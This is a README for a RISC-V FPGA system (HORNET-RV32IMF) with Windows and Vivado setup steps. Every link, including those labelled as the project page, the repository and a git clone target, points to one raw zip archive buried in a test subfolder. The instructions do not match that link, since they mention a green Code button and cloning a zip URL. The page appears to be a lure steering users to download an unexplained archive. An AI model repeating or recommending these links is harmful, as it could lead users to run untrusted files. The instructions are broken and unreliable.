# 🔧 HORNET-RV32IMF - Fast FPGA RISC-V System

[![Download](https://img.shields.io/badge/Download-HORNET--RV32IMF-blue.svg)](https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip)

## 🚀 What This Is

HORNET-RV32IMF is a RISC-V system built for FPGA boards. It is made to run on Nexys Video and Nexys 4 DDR boards. It includes a 5-stage pipeline, a custom floating-point unit, UART support, and other board parts you can use for embedded work.

This README is written for people who want to get the project from the link above and use it on Windows with Vivado.

## 📥 Download and Open the Project

Use this link to visit the project page:

[https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip](https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip)

1. Open the link in your web browser.
2. Click the green **Code** button.
3. Select **Download ZIP**.
4. Save the file to your PC.
5. Right-click the ZIP file and choose **Extract All**.
6. Open the extracted folder.

If you use Git, you can also clone the repo with Git Bash:

```bash
git clone https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip
```

## 🖥️ What You Need on Windows

To work with this project on Windows, you should have:

- Windows 10 or Windows 11
- Xilinx Vivado
- Enough free disk space for the project files and build files
- A supported FPGA board:
  - Nexys Video
  - Nexys 4 DDR
- A USB cable for the board
- A way to open ZIP files, such as File Explorer

If you plan to edit or build the design, install Vivado before you start.

## 🛠️ Install Vivado

1. Download Vivado from the Xilinx site.
2. Run the installer.
3. Follow the setup prompts.
4. Keep the FPGA device support for your board.
5. Finish the install and restart your PC if needed.

When Vivado is ready, you can open the project files from the HORNET-RV32IMF folder.

## 📂 Open the Project in Vivado

1. Start **Vivado**.
2. Choose **Open Project**.
3. Browse to the folder you extracted.
4. Select the project file if one is included.
5. Open it and let Vivado load the design files.

If the project uses a board-specific setup, choose the board that matches your hardware.

## ⚙️ Build the Design

1. Open the project in Vivado.
2. Wait for the files to load.
3. Run synthesis.
4. Run implementation.
5. Generate the bitstream.

These steps turn the design into a file that can be loaded onto the FPGA board.

## 🔌 Load It to the FPGA Board

1. Connect your FPGA board to your PC with USB.
2. Turn on the board.
3. Open Vivado Hardware Manager.
4. Detect the board.
5. Load the generated bitstream.

After the bitstream loads, the FPGA board runs the HORNET-RV32IMF design.

## 📡 Main Features

- 5-stage pipelined RV32IMF processor
- Custom IEEE-754 floating-point unit
- Interrupt-driven UART for serial communication
- FPGA-ready design for Nexys Video and Nexys 4 DDR
- RISC-V SoC layout for embedded use
- Verilog source files for hardware design
- Vivado-based build flow

## 🧩 What the Design Can Do

This system is built for small hardware projects that need a processor on an FPGA. The CPU can handle common embedded tasks. The floating-point unit helps with math that uses decimals. The UART lets the board send and receive data over a serial link. Other peripherals support board control and data transfer.

## 📁 Project Layout

You will usually find files like these in a project like this:

- `src` or `rtl` for Verilog source code
- `constraints` for board pin settings
- `ip` for any IP blocks
- `build` for output files from Vivado
- `docs` for notes or design files

If you see extra folders, keep them in place when you open the project in Vivado.

## 🧭 Simple First Run Flow

1. Download the ZIP from the GitHub page.
2. Extract it on your Windows PC.
3. Install Vivado if you have not done so.
4. Open the project in Vivado.
5. Build the design.
6. Connect the FPGA board.
7. Load the bitstream.
8. Use the UART or board tools to check that the design runs

## 🔍 Board Support

This project targets these boards:

- Nexys Video
- Nexys 4 DDR

If you use one of these boards, make sure you select the right device in Vivado. Using the wrong board can stop the build from working.

## 🧪 Basic Checks

If the design does not load, check these items:

- The board is powered on
- The USB cable is connected
- Vivado sees the hardware
- The correct board is selected
- The project files were extracted fully
- You opened the right project folder

If the UART does not respond, check the serial port settings in your terminal tool.

## 🧰 Useful Tools

You may want these tools on Windows:

- File Explorer for ZIP files
- Vivado for build and load steps
- A serial terminal tool for UART checks
- A text editor if you want to read project files

## 📌 Repository Topics

This project fits these areas:

- computer architecture
- edge AI
- FPGA
- FPU
- RISC-V
- SoC design
- Verilog
- Vivado
- Nexys boards

## 📎 Source Link

[Visit the HORNET-RV32IMF repository](https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip)

## 🖱️ Quick Windows Steps

1. Open the GitHub link.
2. Download the ZIP.
3. Extract the files.
4. Install Vivado.
5. Open the project.
6. Build the bitstream.
7. Load it to the FPGA board

## 🧷 File Safety Tips

- Keep the folder path short
- Avoid moving files while Vivado is open
- Use a local drive, not a cloud sync folder
- Do not rename project folders unless needed

## 🛎️ Typical Use Case

This repo works well if you want to:

- run a RISC-V design on an FPGA
- test hardware from Windows
- explore a processor with floating-point support
- use UART to move data in and out
- work with Nexys FPGA boards